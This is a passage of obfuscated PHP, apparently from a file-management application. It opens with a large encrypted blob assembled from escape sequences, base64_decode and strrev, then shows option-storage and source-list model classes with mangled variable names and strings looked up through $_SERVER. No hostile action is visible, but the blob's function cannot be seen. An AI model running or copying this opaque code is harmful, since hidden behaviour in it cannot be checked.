x74\xd4\x16\x4f\x4\x30\xc7\xb8\x45\x42\x25\x3c\x7b\xbe\x95\xc8\x1b\x39\xdb\x81\xd7\xa8\x17\xe5\x32\xe2\xbc\x6c\x85\x36".base64_decode('qNEiZQrI8erKiO+JMoTHaA5DZryD8/HXEKOcrisjg7BSuo7qE1xV6iOoYpnCsGlG4/OYtw==').base64_decode('TURZ+TM/cAjZEYXHS4E2uHA8/Rz6O+l0Tjiwt8o04qDJ0wyCtwib3ovls7QQOKZsj0bikQ==').base64_decode('Bub3zSnIpWkz2JHDos9YxSmNPbDjukesBOc1/JAC0JAvZLNcGRTDKyeIdaX/dJI7UT3ZPQ==')."\116\276\322\251\261\33\123\300\256\364\12\70\226\52\330\202\46\143\347\26\161\374\44\337\202\144\311\64\50\66\114\252\47\175\235\324\204\100\135\25\173\136\305\124\117\305\323\116\126\122\316\121"."\60\151\350\226\311\265\37\320\247\330\131\345\370\222\17\34\62\225\173\312\53\174\123\53\313\213\163\250\222\257\63\37\353\312\251\147\306\120\46\270\77\2\22\117\236\61\66\204\103\301\266\270"."\32\2\352\136\135\63\333\127\45\336\26\32\226\60\363\113\303\15\262\141\4\74\253\76\307\260\112\114\15\275\145\211\163\25\125\75\353\220\315\322\51\115\233\314\10\154\115\125\125\225\267\252"."\32\375\317\336\134\60\323\223\265\314\50\207\124\244\252\252\226\374\117\63\210\157\63\0\101\147\16\102\211\14\227\103\201\41\135\207\16\1\355\104\347\346\2\343\116\73\33\360\313\123\5\167".base64_decode('DZZFqNgi6CO2WRladbjOVMiNP8R09yRwVQqAZ3ZXQA1uM1KJOtJHJgX6y585o2Ji18yjLw==')."\314\353\170\247\202\331\144\247\374\61\37\233\134\232\50\214\315\173\131\206\127\166\370\2\225\50\242\23\267\204\216\256\241\72\116\243\257\70\5\161\66\11\76\116\234\40\311\155\61\307\53\31"."\262\305\121\371\62\220\144\363\267\302\44\226\346\6\113\160\264\215\267\104\375\12\321\67\273\60\207\45\166\141\312\34\122\5\157\202\243\147\362\30\231\122\174\366\144\140\230\224\336\163\343\171"."\145\64\111\52\316\325\331\204\276\17\250\57\21\333\34\375\206\323\112\210\52\125\225\347\166\36\56\310\106\22\167\326\304\15\41\374\25\340\336\225\250\66\63\353\233\2\30\205\106\211\351\171"."\xea\xb0\x97\x48\x73\x6a\x8f\x29\x5a\x5c\xdb\xbd\xb0\x64\x8d\x1c\xd7\x1c\x6e\x1d\x42\x16\x93\x56\x8a\xdd\x7c\xc5\xbe\x44\xcd\x8f\xa5\x4\x59\x2\xbd\xb3\x6b\xe0\x16\x5f\xa5\x6\xdc\x59\xae\x3a\x1\x7a\x61\x56".base64_decode('VAHSi0uTe8USpXG6qzSx7drATVjLBl+pIEpSGbPA6YbQ12FtDErHUl8ub/ahVbfkSUPp7Q==')."\xa5\x93\x79\xf1\xe2\x92\x25\xa\xf1\xde\xcb\xe5\xe4\x44\x7c\x83\xc9\x3c\x81\x3\x38\xb\xf3\x8\x5a\x92\x13\x47\xa9\xa8\x50\x9\x94\x12\x9d\xbb\x59\xca\x68\xe0\x4e\xd0\xe4\x44\x7c\xcc\x95\x35\xb4\xc8\xa9\xc2".base64_decode('2QY+jjpTeM++AOiY3MMGN/GyUjMtJjASlknJnh5VB5gwWGUKYXiGhOqFM52mUcmE41o4Tg==')."\x10\x5d\x5a\x67\x5e\xeb\x1\x15\x92\x4d\x85\x1b\x8\x33\x47\xc6\x31\x87\x7d\x74\x0\xd3\x5a\xc6\x8b\xc8\xd5\x9c\x79\x7b\xd6\x5d\xc1\x2\xdf\x63\xa5\xf0\xb4\x72\x9f\x9b\xf2\x5\x1c\x9e\x52\x55\x16\x1a\xe1\x1d"."\xdd\xc2\x1d\xa3\x97\x0\x44\x27\xb0\x15\x41\x15\xa1\xdb\xb8\x81\x5a\x8e\xa\xa5\x18\x6e\x9d\xdd\x7d\xa2\x53\xb2\x45\x45\xa0\x1e\x9c\xac\x50\x7\xdb\xa\x76\x1b\x3e\xd1\xb9\x3e\xc5\x15\xc0\x15\x99\x89\xb8\x47".base64_decode('bD5aroTb6nChqEUOjMj7Slk3puiqTPbVgBLuZOaHhOJjoVfhh2F3omF1o6OOoCawIJ0UGw==')."\xb3\x36\x71\x97\x21\x94\x64\xeb\xa3\x38\xa9\xab\x44\x2b\x14\xb9\x21\x44\x75\xe3\x29\x2c\xef\xe9\x56\x48\x37\xe7\x11\x2f\x16\x25\x72\xb1\x1\x10\xf6\x35\x6e\x4a\x1b\x30\x3f\x2a\x63\xda\xfc\x78\x8c\x9b\xf\x24".base64_decode('JfIZlvnbOK3iXSC66lApkMz486KoG6zzGusbUQ4lXhCkE7sr6lalxTUkjgZFJcpL6L7NSA==')."\x37\x73\x92\x20\x54\x50\x49\x50\x20\xe0\x3d\xd7\xae\x63\x81\x8b\x4\x1c\xc5\x24\xcd\xc5\x12\xfd\x83\x56\x79\x9b\xb8\x7\x92\xef\x7a\x60\x60\xf2\x7a\xc2\xcc\x27\x31\x41\x94\xec\xea\x64\xed\xa8\xde\x27\x47\x89".base64_decode('9gLbDcLQutwENlYmoR28CwMJuyCbPpN8MaCY5HNDYkS91QrnYFXaMo1MkzJI+VLMrEt8Kw==')."\xbd\x75\x23\x92\xa9\x58\xa1\x87\x5f\x46\xbb\x58\x4c\xf6\x7c\x4e\x91\x39\x38\xf6\x1e\xe\x37\x40\x6c\x51\xe1\x11\x58\x72\x1e\x6a\x16\xdb\x40\x17\x23\x93\xab\x90\x6f\x16\x55\xa1\x79\x98\x89\x12\xf\xe7\xe4\x1c".base64_decode('CzvT6GCrWCqnxKdIljSjCQZpsMuXiUmCjBGd6W57q2u80+EEIz+mY4czoCNoY0lggI+3DA==')."\215\201\346\63\224\23\145\114\351\112\237\130\177\22\166\156\210\101\53\276\236\304\362\25\217\345\45\136\102\270\244\47\246\241\144\264\56\64\226\250\262\64\56\320\121\52\237\316\20\316\156\164"."\xa8\xb7\xbb\xa\xa0\xfd\xe1\xcc\x7\xb7\x1a\xa2\x33\xd4\x3a\x95\xe9\x50\x37\x74\x35\x2\xbe\x5b\x64\xc7\x21\xa4\x96\x18\x87\x78\x3\x80\x92\x4c\xea\xbc\x43\x9a\x18\xa1\x79\x45\x8d\x66\xb1\x7\x10\x1c\xc9\x89"."\344\270\311\23\213\265\267\60\124\102\223\324\352\0\234\170\53\52\261\325\1\207\264\261\165\204\277\15\307\52\217\230\110\163\245\166\113\216\260\134\16\234\226\43\102\125\74\35\265\171\22\57"."\65\244\63\3\2\354\244\336\336\322\356\347\111\365\174\173\122\101\211\260\311\327\300\364\50\365\141\35\16\170\103\31\43\241\204\43\315\241\206\100\270\61\24\133\244\364\341\153\130\241\147\210"."\272\253\222\155\253\132\302\101\15\361\310\343\334\340\104\166\114\227\203\301\172\17\367\16\203\203\336\36\164\216\360\46\371\131\313\22\247\52\62\102\150\114\270\322\163\66\113\241\122\317\27\265"."\x98\xc5\xef\xfc\xd2\x45\x75\xb0\x44\xbc\x44\xe9\xb4\x90\xff\x4a\x85\x73\x79\xbd\xb8\xfc\x88\x8e\xf5\x1d\xa5\x1e\x4b\x15\xa\x25\x7a\x3\xe5\x4b\x7f\x81\xb8\xf4\x91\x4b\x23\xf6\x48\xcf\x8e\xd7\x79\x23\x3b\x68"."\130\206\100\7\254\306\210\334\172\240\261\65\324\246\6\302\341\310\22\207\232\260\270\13\310\163\101\112\122\166\257\44\255\214\130\4\372\365\142\203\220\140\176\117\166\135\341\22\256\320\345\223".strrev('/ÇtaXéRŸ’ÛÒpZ)^é¦gÓ¥§VxT×SÔ	K¥†kË–rThVîå}¸Øæ‹-').base64_decode('EA01t8T/x101ksJmoJFkemj88TT1xNIgO75l3xT+fopT/qfu4zziEk4lNteYn0qTHJuApw==').base64_decode('p2mhiErNj4lPIC4mP5KTr239SWgBW0cNsitCHBHnFlwKGsFfoadZdEjHAkV2wmHCOYRGYA==')."\302\35\272\227\56\377\167\156\155\171\207\167\273\242\157\20\147\53\64\217\334\114\241\222\335\142\114\50\306\235\53\211\252\356\234\22\35\100\331\212\20\171\361\2\112\235\122\105\135\61\162\307"."\71\312\174\146\42\102\174\200\130\70\14\146\162\266\343\244\337\42\277\234\221\226\204\46\140\371\117\236\13\360\350\232\263\50\136\330\72\266\230\252\114\73\11\36\26\347\77\254\226\151\146\106"."\212\22\34\322\261\60\33\15\127\220\306\316\206\262\275\246\74\353\4\237\343\307\123\324\321\52\25\104\170\320\171\104\267\213\135\266\321\352\377\67\25\151\146\114\62\165\353\154\244\270\103\226"."\233\176\12\136\16\173\243\113\231\103\116\357\253\70\305\355\177\316\341\171\116\332\141\304\340\201\354\53\317\131\311\123\344\364\111\41\216\263\25\204\214\140\355\261\142\17\73\350\222\302\322\247"."\47\323\237\56\370\145\324\320\335\11\212\347\340\223\225\34\24\33\122\106\72\231\347\52\133\42\241\125\27\322\7\122\13\41\226\234\306\34\204\23\317\224\215\14\245\203\237\251\122\116\11\261"."\135\123\247\273\54\341\205\114\220\136\247\127\46\256\24\140\211\55\144\331\16\77\140\161\63\256\365\171\50\250\142\244\50\142\365\43\162\130\126\332\47\243\100\231\114\102\230\344\353\275\100\52"."\xc0\x5c\x7b\x26\x3d\xc4\xef\x24\xc5\x8b\x6e\x47\x56\xd2\xfe\xe4\xe8\x57\xae\xdd\x97\x36\x7b\xb4\x34\xe8\x13\x3a\x9e\xda\xe5\xd1\x11\x4d\x67\x24\xc4\x51\x8c\x26\xf9\xb5\x5c\x4e\xdc\x87\xc8\x14\x17\xfd\xeb\x78"."\141\15\171\35\361\26\225\130\33\121\251\322\102\114\300\234\164\107\111\23\341\276\262\220\15\321\173\31\107\152\136\72\74\312\106\242\351\135\215\170\250\13\305\121\77\333\351\345\54\114\230\334"."\x24\xbb\x30\xe7\x72\x76\x84\x8f\xf8\x19\xdb\x5f\x7c\xc1\x8e\x55\xd1\x0\xa3\x10\x7\xf5\x42\x23\x85\x98\xfe\x90\x4f\x77\x50\x40\x99\xaf\x8\xd0\x70\x6c\x64\xc\x4a\x88\xc5\xa6\x9e\x3d\x9\xa6\x90\x31\xda\x17"."\244\112\116\326\300\203\150\51\237\151\24\362\311\117\243\336\313\117\112\70\56\170\3\331\142\222\120\320\161\73\367\54\166\124\312\234\222\262\255\3\36\111\113\270\31\35\327\113\251\107\274\311"."\376\42\127\154\342\225\257\323\357\74\36\7\347\54\370\141\244\350\74\343\76\312\360\151\165\125\210\272\47\71\156\26\13\235\205\12\202\303\207\252\64\152\100\155\305\176\130\245\151\220\306\135"."\310\247\75\104\33\303\303\264\42\113\272\162\165\70\206\163\57\150\11\147\260\137\332\40\274\212\40\47\271\244\23\353\325\316\357\311\263\153\153\167\61\303\1\273\210\0\213\247\177\324\44\164".base64_decode('EYFYlknWTJ85V5aYiCUUl7lgYQXupIHHEUChOMFQYXao5d1PMp3PbIr9BrsowP9sw4jDBw==')."\55\52\151\356\26\173\130\57\232\1\2\247\222\376\230\104\20\135\172\77\46\126\305\261\304\256\243\44\120\170\13\166\176\213\262\17\45\306\41\321\75\261\131\250\347\127\63\215\17\356\31\174"."\41\140\347\65\347\171\264\324\261\213\314\4\73\343\141\231\256\210\71\65\243\100\104\43\262\245\163\231\334\242\155\272\345\113\270\72\246\213\104\126\32\311\62\67\16\330\140\205\330\155\22\46"._kodDe('KxLtEx9VLsbEQ4u2/Gq2v4+mkDLTlHYFjHFReBgijPYL59jE657FUcwr/OwYYZe7OvZVA60=')."\47\140\347\270\135\315\243\152\242\215\156\217\62\136\241\142\166\117\162\6\54\214\44\112\214\36\256\315\236\224\217\43\100\40\57\232\235\54\223\354\253\224\74\7\26\326\174\310\326\165\154\143".strrev('Ã”ÛÙäŸM¶äÌSŸ~’kcÌĞ3t‚ƒDÜØ"0TäDìB¯Ï%¦âï$4–œü»ìÉ')."\222\107\141\104\23\42\354\101\5\352\216\343\30\213\342\215\56\257\357\4\177\271\135\301\263\71\43\110\103\340\103\351\221\277\343\250\304\235\141\72\216\116\226\333\43\56\142\5\35\216\111\222"."\x45\x4e\xc4\x1\x71\x92\x27\x75\xf4\x6b\x12\xe9\x15\x54\x56\x84\xda\xa\x19\x11\x91\x24\xca\xe4\xbc\xc5\x33\x1d\xb6\x10\xb0\x29\x40\x17\x8e\x60\x16\x16\x2c\x97\xa3\x6c\x6a\xc7\x9c\x86\xd9\xb1\xe0\x7f\xed\xc"."\xf6\xff\x95\xf\xd8\x99\x55\x4c\xf6\xef\xf0\x1d\xdf\xc\xcc\x39\xf4\x16\x5f\xb0\x72\x59\x7\x95\x3b\xbb\xc6\xe1\x24\xaf\x47\x3\x14\xa1\xc9\xf7\x49\xae\xeb\x49\x9c\xab\x95\x33\x73\x90\xcc\x4a\xa4\xc6\xee\xdf".base64_decode('tHRaIsKljzNFHroR8PVzr86lIu4Hw25v3Z1E7MsccXeXKijwEj81lYBjmsSYZYGTskaivw==').strrev('ˆÉi'."\0".'Dö"¶3îP%eƒ±ÉÛ~Of7bEÇÀ”,ı6va‡ˆ¢b¢“˜úu’Ñ9åÄ')."\xca\x91\x54\x84\xde\xe2\x8e\x35\x71\x24\xca\xd3\x2d\x70\x90\x8f\x2d\xa7\xa3\x46\xab\xcb\xf9\x30\x2d\x64\xc9\x73\xeb\xb8\x2f\x28\xd6\xa5\x28\xae\xcd\xf1\x80\x5c\x5\x6b\xf3\x3b\x45\x63\x78\x81\x71\xc7\xbc\x55"."\136\127\102\265\327\325\34\367\277\354\204\165\207\103\140\252\177\202\66\110\24\213\100\230\50\214\134\71\221\273\147\157\161\35\12\327\61\121\146\234\235\125\172\177\363\116\11\161\40\16\311\363"."\301\360\104\173\336\44\214\242\63\225\213\205\44\175\351\204\44\163\165\363\176\64\171\262\257\210\152\61\224\351\130\51\254\260\47\256\72\343\221\150\120\135\22\302\166\50\102\147\7\73\230\165"."\145\303\44\176\115\130\223\35\255\25\344\51\33\154\0\164\212\151\62\5\50\351\10\231\111\2\140\141\42\330\316\344\32\370\305\254\363\101\264\364\154\202\31\350\222\105\222\316\302\370\355\213"."\163\57\56\50\125\54\141\346\55\331\276\246\43\23\263\135\46\312\215\262\163\164\107\26\155\144\75\141\353\111\5\23\160\7\117\337\71\243\152\172\367\27\265\62\203\171\32\104\45\147\174\111"."\111\70\134\304\246\173\231\156\57\53\123\262\236\111\215\346\224\312\303\256\356\155\7\20\11\247\70\156\147\70\115\16\203\124\265\222\210\124\41\246\271\300\53\322\70\153\323\146\66\10\326\302"."\x95\x87\x51\xc3\xf8\xb9\xf8\x74\xca\x6f\x9f\x99\xf\x15\xac\x37\xe7\xc7\x96\xbb\xf0\xe3\xc\x3f\x81\x3f\x90\x6c\x2f\x53\x33\x2a\x53\x23\xc2\x32\x1\x21\xd9\x21\x18\xb7\xf8\x4c\x8\x5f\xb2\xf3\x23\x91\x7c\x34"."\303\337\144\20\151\16\25\320\70\344\64\240\55\40\47\111\267\347\350\260\225\164\272\21\43\231\44\231\231\361\206\26\244\373\137\347\365\73\177\344\132\104\377\12\106\130\312\46\265\230\71\130".base64_decode('9Ivf64eE3SSSTe+wAoMaN03mrtXhOMhKl/UJgiGCxfex4ppY4h5ZNXwSFoTdlS5hVEHztA==')."\101\301\13\213\263\130\62\331\244\15\226\50\232\324\335\246\345\120\12\57\112\170\151\311\320\206\170\50\243\17\311\137\207\162\342\35\213\243\140\161\252\60\304\41\325\27\167\160\142\230\70\255"."\324\360\11\206\163\126\227\15\175\160\240\22\111\324\115\24\327\154\221\316\275\130\365\107\250\274\320\241\160\361\216\370\244\323\254\10\57\306\327\14\225\41\317\356\274\216\124\327\111\36\113\322"."\x18\x1f\xe8\xca\x2\xd9\x92\xd4\x7c\x49\x11\x94\x4\x2\x7a\x3a\x2c\x35\x27\xdf\xcf\x8f\x5b\x21\x56\xfa\x23\x2\x2a\x9d\x53\x2c\xd9\x63\x11\x19\x8c\x65\x31\x1d\x93\x2f\xd1\x2c\x3e\x30\x28\x19\x95\x33\x1d\xdd"."\x71\x2f\x2d\x39\x78\xa\xf0\xa5\x89\x19\x22\xc6\xa7\x79\x1\x67\x16\x2d\xaf\xbb\x7a\x2f\x57\x70\x8f\x8c\xd6\x70\x78\x10\x94\xd3\x87\xc\x3b\x91\x92\x4e\xc9\xc5\x99\xc5\xe9\xf9\xa2\xc9\x86\xe\x94\x1e\x87\xbb"."\xb7\x6c\xae\xdd\xb2\x3\xd1\x48\x51\x7f\x24\xe5\x9f\xb8\x59\xa2\xe\xed\x51\xc9\x6a\x34\xb\xd7\x14\x87\x13\x47\xdd\x71\xa6\x0\xd7\xa5\x59\xb8\x6e\x51\x36\xab\x5c\x34\xaf\xa4\x9e\xad\x15\xac\x71\x86\x57\x3c"."\171\40\213\112\226\30\260\220\330\110\105\307\233\317\222\205\213\77\7\220\350\56\115\204\127\245\173\41\144\116\56\165\213\122\275\50\131\170\334\136\270\113\13\236\3\237\100\113\345\70\164\226"."\x9c\x14\xa5\x14\xde\x66\x39\x25\x30\x35\xc5\x42\xe3\x2a\x33\x9\x5\x9f\x62\x92\x21\xf2\x4a\xa8\x1b\xd1\x4f\x62\xee\x47\xb6\xe1\x58\x22\x5b\xd6\x5d\x2a\xad\xdd\x14\x2d\x89\x65\x2c\xa7\xda\x91\x2b\x5d\x9e\x20"."\260\100\16\34\64\0\60\142\301\322\106\277\120\353\144\257\72\46\73\110\111\41\333\237\65\71\171\112\12\255\135\314\71\5\362\356\171\56\152\315\11\372\331\202\144\13\276\344\43\23\17\26".base64_decode('DBWLYNIaf+0nNN/omdm0jYTuNDgvm3Kk+ewjaUkM7ZIACzGVQwGmhFyUJAHHLC5jaHsScw==').base64_decode('JGDC8QaMsiRwh0WvvxuwTga/+CRWzykJp9kxM297cF7czJHfetO2hTYJlQsRNhvTYY+kLA==')."\x85\x42\xe2\x96\x13\x77\x8a\x5c\x9f\x11\xb0\x25\x18\x8b\x4\xe1\x22\x1e\xb\x5c\x62\x3a\xcd\x25\x78\xce\x11\xc1\xd7\x72\x3c\x22\x93\x59\xb8\x90\x6f\x2a\xb8\x54\x6\x44\x42\xbf\x99\xec\x31\x87\x99\xfd\x44\x4"."\127\322\44\211\213\73\315\315\133\12\266\10\100\121\126\375\42\366\107\54\77\315\361\203\167\43\57\151\3\74\243\372\126\344\372\34\325\251\257\111\256\270\375\105\55\200\360\136\64\101\135\233"."\20\111\52\274\121\213\305\143\105\131\355\201\130\154\111\44\332\110\75\241\24\145\223\132\222\202\135\121\126\173\113\244\155\274\274\140\153\40\24\56\312\303\272\170\155\252\260\304\111\263\102\355".base64_decode('pJfk7nm8XoQaFomeFBtAZXdlYXCeKdZFujvKpUx2JcTKx7Q0EwZJdwt6RphqFXWcMi55/Q==')."\55\146\123\231\7\234\356\7\135\252\261\14\260\241\41\254\131\327\6\155\107\163\220\212\75\310\160\374\300\371\174\371\175\257\120\365\360\71\124\102\244\164\262\237\10\202\222\340\124\246\375\44"."\141\152\311\311\222\357\35\212\357\304\110\256\230\14\334\311\63\115\120\334\134\141\366\110\167\136\364\304\5\357\315\141\172\45\115\112\32\166\144\333\132\137\111\315\10\52\116\306\30\103\10\172".base64_decode('/w/9V53bV7gAAA==')."".base64_decode('').""."".base64_decode(''), 10, -8))); goto aì…æîÇğÀ; dß²¥¬¸¸ã: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\155\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($åÌÓÓ³¢ = false, $ß‡ùÁ¢å = "\x6d\x6f\144\x69\x66\x79\124\x69\155\x65", $ë£¿ß÷¸ = false) { $Ï”‹³ûó = Model($this->modelType)->get(!1, $this->optionType, !0); $ÊèŸŒş´ = array_values($Ï”‹³ûó); if ($ÊèŸŒş´ && $ÊèŸŒş´[0] && !is_array($ÊèŸŒş´[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ï”‹³ûó = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ï”‹³ûó) { return $åÌÓÓ³¢ ? null : array(); } if (!$åÌÓÓ³¢) { $Ï”‹³ûó = array_filter(array_values($Ï”‹³ûó)); return array_sort_by($Ï”‹³ûó, $ß‡ùÁ¢å, $ë£¿ß÷¸); } return $Ï”‹³ûó[$_SERVER[óÔë„ú][472] . $åÌÓÓ³¢]; } public function insert($çäÉÁ¹ø) { $”µ’Á¤å =& $_SERVER[óÔë„ú]; $çäÉÁ¹ø = array_field_key($çäÉÁ¹ø, $this->field); $í¼í¦¿„ = Model($this->modelType)->get($”µ’Á¤å[473], $this->optionType . $”µ’Á¤å[474]); $í¼í¦¿„ = $í¼í¦¿„ ? $í¼í¦¿„ : 0; $çäÉÁ¹ø[$”µ’Á¤å[475]] = ++$í¼í¦¿„; $çäÉÁ¹ø[$”µ’Á¤å[231]] = time(); $çäÉÁ¹ø[$”µ’Á¤å[88]] = time(); Model($this->modelType)->set($”µ’Á¤å[473], $í¼í¦¿„, $this->optionType . $”µ’Á¤å[474]); Model($this->modelType)->set($”µ’Á¤å[472] . $í¼í¦¿„, $çäÉÁ¹ø, $this->optionType); return $í¼í¦¿„; } public function update($°òªç…, $­äç•¤•) { $‰îğôì£ =& $_SERVER[óÔë„ú]; $­äç•¤• = array_field_key($­äç•¤•, $this->field); $¾ÓÂ—²È = $this->listData($°òªç…); if (!$¾ÓÂ—²È || !$°òªç…) { return !1; } $­äç•¤• = array_merge($¾ÓÂ—²È, $­äç•¤•); $­äç•¤•[$‰îğôì£[88]] = time(); return Model($this->modelType)->set($‰îğôì£[472] . $°òªç…, $­äç•¤•, $this->optionType); } public function remove($¥›Ø›¥†) { if (!$¥›Ø›¥†) { return !1; } return Model($this->modelType)->remove($_SERVER[óÔë„ú][472] . $¥›Ø›¥†, $this->optionType); } public function clear() { $È…Œ =& $_SERVER[óÔë„ú]; Model($this->modelType)->remove($È…Œ[473], $this->optionType . $È…Œ[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($§ŸéôÛ‚, $ ¶•ÉÇ) { if (!$ ¶•ÉÇ) { return !1; } $¬÷¨Õ×î = $this->listData(); $¬÷¨Õ×î = array_to_keyvalue($¬÷¨Õ×î, $§ŸéôÛ‚); return isset($¬÷¨Õ×î[$ ¶•ÉÇ]) ? $¬÷¨Õ×î[$ ¶•ÉÇ] : !1; } public function findByName($²¼ù¹áË) { return $this->findByKey($_SERVER[óÔë„ú][32], $²¼ù¹áË); } protected function resetData($¡±ãèÌ) { $—›µ£×Ó =& $_SERVER[óÔë„ú]; $¡±ãèÌ = is_array($¡±ãèÌ) ? $¡±ãèÌ : array(); $·˜ş€¿Ø = array(); for ($Ñ‡«§ØÅ = 0; $Ñ‡«§ØÅ < count($¡±ãèÌ); $Ñ‡«§ØÅ++) { $·˜ş€¿Ø[$—›µ£×Ó[472] . $¡±ãèÌ[$Ñ‡«§ØÅ][$—›µ£×Ó[475]]] = $¡±ãèÌ[$Ñ‡«§ØÅ]; } return Model($this->modelType)->set($·˜ş€¿Ø, !1, $this->optionType); } private function getAutoName($³çóÙ¤î) { $—„²™Şà = array_to_keyvalue($this->listData(), $_SERVER[óÔë„ú][32]); if (!$—„²™Şà || !isset($—„²™Şà[$³çóÙ¤î])) { return $³çóÙ¤î; } for ($ ïÖ¨¿ã = 1; $ ïÖ¨¿ã < count($—„²™Şà); $ ïÖ¨¿ã++) { $“êğ”ù = $³çóÙ¤î . "\x28{$ ïÖ¨¿ã}\x29"; if (!isset($—„²™Şà[$“êğ”ù])) { return $“êğ”ù; } } return $“êğ”ù; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($àÃÑ‘ğŸ = false, $ôØ¿İ‡£ = '', $Ùı±õ‘ = false) { $ô¾š’™ô =& $_SERVER[óÔë„ú]; $ÙÊ•ŞÊ = $this->cacheGet($ôØ¿İ‡£); $å§‹Áˆõ = $this->optionDefault($ôØ¿İ‡£); $å§‹Áˆõ = is_array($å§‹Áˆõ) ? $å§‹Áˆõ : array(); if (is_array($ÙÊ•ŞÊ)) { $ÙÊ•ŞÊ = array_merge($å§‹Áˆõ, $ÙÊ•ŞÊ); return $àÃÑ‘ğŸ ? isset($ÙÊ•ŞÊ[$àÃÑ‘ğŸ]) ? $ÙÊ•ŞÊ[$àÃÑ‘ğŸ] : null : $ÙÊ•ŞÊ; } $¯ãÎÑœø = $this->filterWhere(array($ô¾š’™ô[33] => $ôØ¿İ‡£)); $ÙÊ•ŞÊ = $this->where($¯ãÎÑœø)->select(); $ÙÊ•ŞÊ = array_to_keyvalue($ÙÊ•ŞÊ, $ô¾š’™ô[97], $ô¾š’™ô[450]); foreach ($ÙÊ•ŞÊ as $üËóÔãå => $½î‘Š) { if ($Ùı±õ‘ || in_array($üËóÔãå, $this->jsonField)) { $ÙÊ•ŞÊ[$üËóÔãå] = json_decode($½î‘Š, !0); } } $this->cacheSet($ôØ¿İ‡£, $ÙÊ•ŞÊ); $ÙÊ•ŞÊ = array_merge($å§‹Áˆõ, $ÙÊ•ŞÊ); return $àÃÑ‘ğŸ ? $ÙÊ•ŞÊ[$àÃÑ‘ğŸ] : $ÙÊ•ŞÊ; } public function set($†Ô§‘ï», $¦°ÔÛñ… = false, $ØúÔ„½Ÿ = '') { $Ï•ºÛÉÙ =& $_SERVER[óÔë„ú]; $this->cacheRemove($ØúÔ„½Ÿ); $ó¡ñó¿Ö = array(); $Ò“–Ûã = is_array($†Ô§‘ï») ? $†Ô§‘ï» : array($†Ô§‘ï» => $¦°ÔÛñ…); foreach ($Ò“–Ûã as $ìôíÜÇ‚ => $óöĞóº¸) { if (is_array($óöĞóº¸)) { $óöĞóº¸ = json_encode_force($óöĞóº¸); } $this->checkLength($óöĞóº¸, !1, $this->tableName . $Ï•ºÛÉÙ[4] . $†Ô§‘ï»); $óöĞóº¸ = self::textEncode($óöĞóº¸); $Ò“–Ûã = array($Ï•ºÛÉÙ[33] => $ØúÔ„½Ÿ, $Ï•ºÛÉÙ[97] => $ìôíÜÇ‚, $Ï•ºÛÉÙ[450] => $óöĞóº¸); $ó¡ñó¿Ö[] = $this->filterWhere($Ò“–Ûã); } if (!$ó¡ñó¿Ö) { return !0; } $È¶¼Ëû§ = $this->cacheKey($Ï•ºÛÉÙ[476]); CacheLock::lock($È¶¼Ëû§); $Ğ›ëÍùà = $this->addAll($ó¡ñó¿Ö, array(), !0); CacheLock::unlock($È¶¼Ëû§); return $Ğ›ëÍùà; } protected function optionDefault($õÀüñÛ = '') { return !1; } public function setDeep($—±¦Ùƒª, $¢¾¬¤¿Å = false, $á¯¦³à = '') { $ƒõûäò¶ = explode($_SERVER[óÔë„ú][10], $—±¦Ùƒª); $‚åè«Ùæ = $this->get(); array_set_value($‚åè«Ùæ, $—±¦Ùƒª, $¢¾¬¤¿Å); $this->set($ƒõûäò¶[0], $‚åè«Ùæ[$ƒõûäò¶[0]], $á¯¦³à); } public function remove($âıÒ£ù, $úıâñÚÊ = '') { $åÜÅÖùê =& $_SERVER[óÔë„ú]; $this->cacheRemove($úıâñÚÊ); $„ÕåĞÎŸ = $this->filterWhere(array($åÜÅÖùê[97] => $âıÒ£ù, $åÜÅÖùê[33] => $úıâñÚÊ)); if (is_null($âıÒ£ù)) { unset($„ÕåĞÎŸ[$åÜÅÖùê[97]]); } return $this->where($„ÕåĞÎŸ)->delete(); } public function cacheSet($ËŠØ–½º, $ô‚„ˆ×Ê = false) { return Cache::set($this->cacheKey($ËŠØ–½º), $ô‚„ˆ×Ê); } public function cacheGet($Ü¦Å˜Ï•) { return Cache::get($this->cacheKey($Ü¦Å˜Ï•)); } public function cacheRemove($í±øšó˜) { return Cache::remove($this->cacheKey($í±øšó˜)); } protected function filterWhere($šŸó‘ş•) { return $šŸó‘ş•; } protected function cacheKey($üä›…ë ) { return $üä›…ë ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\155\145" => "\x69\157\x5f\163\x6f\165\x72\143\x65\x5f\155\x65\164\x61", "\155\145\164\141\x46\x69\145\x6c\144" => "\163\157\165\162\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\x6d\x65", "\164\x69\155\145", "\151\x6e\x73\145\162\164", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\143\162\145\x61\x74\145\124\151\155\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\x72\x74", "\x66\165\x6e\143\164\x69\x6f\156"), array("\166\151\145\x77\x54\x69\155\x65", "\164\x69\x6d\x65", "\x69\x6e\163\x65\x72\x74", "\146\x75\x6e\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($‘Ú÷Ø¸) { return $this->listSource(array($_SERVER[óÔë„ú][477] => $‘Ú÷Ø¸)); } public function typeName($°§Â†ùĞ) { static $˜æ€²ñ‡ = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $˜æ€²ñ‡[$°§Â†ùĞ . $_SERVER[óÔë„ú][12]]; } public function sourceListInfo($¶úê¢ê³, $™ŸÔğ¿¼ = false) { $³ø¸ñ³§ =& $_SERVER[óÔë„ú]; $¶úê¢ê³ = $¶úê¢ê³ ? $¶úê¢ê³ : array(); $¶úê¢ê³ = array_filter(array_unique($¶úê¢ê³)); if (!$¶úê¢ê³) { return array(); } $§€ŒüÎ = $this->where(array($³ø¸ñ³§[193] => 